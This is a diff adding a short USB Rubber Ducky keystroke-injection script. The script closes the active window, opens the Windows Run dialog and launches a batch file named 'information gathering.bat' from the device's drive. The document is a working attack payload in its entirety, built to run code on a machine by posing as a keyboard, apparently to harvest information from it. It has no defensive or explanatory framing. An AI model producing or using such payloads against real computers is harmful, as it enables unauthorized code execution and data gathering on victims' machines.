@@ -1,0 +1,9 @@
+DELAY 200
+ALT F4
+DELAY 200
+GUI r
+DELAY 150
+REM Replace [DRIVE_LETTER] with the drive letter of your rubber ducky (i.e. E:\)
+STRING [DRIVE_LETTER]:\information gathering.bat
+DELAY 150
+ENTER
